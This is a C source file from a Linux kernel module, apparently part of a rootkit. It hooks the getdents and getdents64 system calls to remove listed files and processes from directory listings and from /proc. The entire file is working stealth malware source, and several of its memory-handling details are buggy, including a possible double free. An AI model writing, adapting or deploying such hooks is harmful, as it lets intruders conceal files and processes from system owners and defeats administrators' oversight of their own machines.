#include "getdents_hook.h"

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/limits.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/ptrace.h>

#include "../tools/string_list.h"
#include "../tools/tools.h"

extern PStringList hidden_files;
extern PStringList hidden_procs;

static int getdents_payload(unsigned int fd, struct linux_dirent* dirent, unsigned int count, int ret){
    struct linux_dirent *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned int offset = 0;
    long error;
    struct file* dir_file;
    char *dir_path, *d_name_start; 
    char *filepath;
    bool is_proc;
    

    dir_path = kzalloc(PATH_MAX+1, GFP_KERNEL);
    filepath = kzalloc(PATH_MAX+1, GFP_KERNEL);
    if(dir_path == NULL || filepath == NULL)
    {
        if(dir_path)
            kfree(dir_path);
        if(filepath)
            kfree(filepath);
        return ret;
    }
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if((ret<=0) || (dirent_ker==NULL)){
        return ret;
    }
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    dir_file = fget(fd);
    if(!dir_file)
        goto done;

    d_name_start = d_path(&(dir_file->f_path), dir_path, PATH_MAX);
    if(IS_ERR(d_name_start))
        goto done;
    is_proc = strcmp(d_name_start, "/proc") ? false : true;
    //printk(KERN_INFO"Direrctory path: %s\n", d_name_start);
    while(offset < ret){
        current_dir = (void*)dirent_ker+offset;
        memset(filepath, 0, PATH_MAX);
        strcpy(filepath, d_name_start);
        strcat(filepath, "/");
        strcat(filepath, current_dir->d_name);
        // Hide by filename
        if (list_have(hidden_files, current_dir->d_name)){
            printk(KERN_INFO "Hide file %s\n", current_dir->d_name);
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        // Hide by fullname
        }else if (list_have(hidden_files,filepath)){
            printk(KERN_INFO "Hide file %s\n", current_dir->d_name);
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        // Processes
        }else if(is_proc){
            // Hide process by pid
            if(list_have(hidden_procs, current_dir->d_name)){
                printk(KERN_INFO "Hide process %s\n", current_dir->d_name);
                if(current_dir == dirent_ker){
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                previous_dir->d_reclen += current_dir->d_reclen;
            // Hide process by name
            }else{
                char* proc_name = get_namy_by_pid(current_dir->d_name);
                if(proc_name != NULL && list_have(hidden_procs, proc_name)){
                    kfree(proc_name);
                    proc_name == NULL;
                    printk(KERN_INFO "Hide process %s\n", current_dir->d_name);
                    if(current_dir == dirent_ker){
                        ret -= current_dir->d_reclen;
                        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                        continue;
                    }
                    previous_dir->d_reclen += current_dir->d_reclen;
                }
                else{
                    previous_dir = current_dir;
                }
                if(proc_name)
                    kfree(proc_name);
            }
        }else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;
done:
    kfree(dir_path);
    kfree(filepath);
    kfree(dirent_ker);
    return ret;
}

static int getdents64_payload(unsigned int fd, struct linux_dirent64* dirent, unsigned int count, int ret){
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned int offset = 0;
    long error;
    struct file* dir_file;
    char *dir_path, *d_name_start; 
    char *filepath;
    
    dir_path = kzalloc(PATH_MAX+1, GFP_KERNEL);
    filepath = kzalloc(PATH_MAX+1, GFP_KERNEL);
    if(dir_path == NULL || filepath == NULL)
        return ret;
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if((ret<=0) || (dirent_ker==NULL)){
        return ret;
    }
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    dir_file = fget(fd);
    if(!dir_file)
        goto done;

    d_name_start = d_path(&(dir_file->f_path), dir_path, PATH_MAX);
    if(IS_ERR(d_name_start))
        goto done;

    //printk(KERN_INFO"Direrctory path: %s\n", d_name_start);
    while(offset < ret){
        current_dir = (void*)dirent_ker+offset;
        memset(filepath, 0, PATH_MAX);
        strcpy(filepath, d_name_start);
        strcat(filepath, "/");
        strcat(filepath, current_dir->d_name);
        if (list_have(hidden_files, current_dir->d_name)){
            printk(KERN_INFO "Hide file %s\n", current_dir->d_name);
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }else if (list_have(hidden_files,filepath)){
            printk(KERN_INFO "Hide file %s\n", filepath);
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;
done:
    kfree(dir_path);
    kfree(filepath);
    kfree(dirent_ker);
    return ret;
}

#ifdef PTREGS_SYSCALL_STUBS
extern asmlinkage int (*orig_getdents)(const struct pt_regs *);
extern asmlinkage int (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents(const struct pt_regs *regs){
    unsigned int fd = (unsigned int)regs->di;
    struct linux_dirent* dirent = (struct linux_dirent*) regs->si;
    unsigned int count = regs->dx;
    int ret = orig_getdents(regs);
    return getdents_payload(fd, dirent, count, ret);
}

asmlinkage int hook_getdents64(const struct pt_regs *regs){
    unsigned int fd = (unsigned int)regs->di;
    struct linux_dirent64* dirent = (struct linux_dirent64*) regs->si;
    unsigned int count = regs->dx;
    int ret = orig_getdents64(regs);
    return getdents64_payload(fd, dirent, count, ret);
}
#else
extern asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
extern asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);

asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    int ret = orig_getdents(fd, dirent, count);
    return getdents_payload(fd, dirent, count, ret);
}

asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    int ret = orig_getdents64(fd, dirent, count);
    return getdents64_payload(fd, dirent, count, ret);
}
#endif
